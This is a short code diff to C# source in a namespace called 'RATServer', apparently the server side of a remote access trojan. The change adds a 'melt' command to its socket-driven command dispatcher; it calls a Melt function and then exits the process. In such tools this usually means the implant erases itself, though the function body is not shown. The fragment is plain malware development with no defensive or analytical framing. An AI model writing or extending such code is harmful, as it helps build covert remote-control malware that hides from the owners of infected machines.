@@ -46,6 +46,7 @@ namespace RATServer
                 sock.SendTimeout = 5000;
                 try
                 {
+                    bool exitAfter = false;
                     NetworkStream nstream = sock.GetStream();
                     byte[] message = new byte[sock.ReceiveBufferSize + 1];
                     int bytesRead = nstream.Read(message, 0, Convert.ToInt32(sock.ReceiveBufferSize));
@@ -121,11 +122,16 @@ namespace RATServer
                         case "ping":
                             r = Functions.Ping(c.Args[0]);
                             break;
+                        case "melt":
+                            r = Functions.Melt();
+                            exitAfter = true;
+                            break;
                         default:
                             break;
                     }                 
                     byte[] sendBytes = Encoding.Unicode.GetBytes(SerializeToXml(r));
                     nstream.Write(sendBytes, 0, sendBytes.Length);
+                    if (exitAfter) { Environment.Exit(0); }
                 }
                 catch
                 {
